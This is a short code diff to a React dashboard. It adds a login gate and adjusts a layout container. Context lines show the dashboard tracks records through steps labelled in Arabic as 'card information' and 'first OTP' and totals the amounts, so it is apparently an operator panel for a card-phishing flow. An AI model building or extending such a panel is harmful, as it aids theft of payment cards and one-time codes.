@@ -1,5 +1,6 @@
 import { useState, useEffect, useMemo } from "react";
 import { base44 } from "@/api/base44Client";
+import DashboardLogin from "@/components/DashboardLogin";
 import { formatDistanceToNow, format } from "date-fns";
 import { ar } from "date-fns/locale";
 import {
@@ -273,6 +274,7 @@ const STEP_LABELS = { 1: "معلومات البطاقة", 2: "OTP الأول", 3
 
 // --- MAIN DASHBOARD ---
 export default function Dashboard() {
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [records, setRecords] = useState([]);
   const [loading, setLoading] = useState(true);
   const [filterType, setFilterType] = useState("all");
@@ -377,6 +379,10 @@ export default function Dashboard() {
   const step4Count = records.filter(r => (r.step_reached||0) >= 4).length;
   const totalAmount = records.reduce((s, r) => s + (parseFloat(r.amount)||0), 0);
 
+  if (!isAuthenticated) {
+    return <DashboardLogin onLogin={() => setIsAuthenticated(true)} />;
+  }
+
   if (loading && records.length === 0) {
     return (
       <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 flex items-center justify-center">
@@ -477,7 +483,7 @@ export default function Dashboard() {
           </div>
         </header>
 
-        <div className="p-6 space-y-6 w-full h-full relative z-10">
+        <div className="p-6 space-y-6 max-w-[1920px] mx-auto relative z-10">
           {/* Stats */}
           {showStats && (
             <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
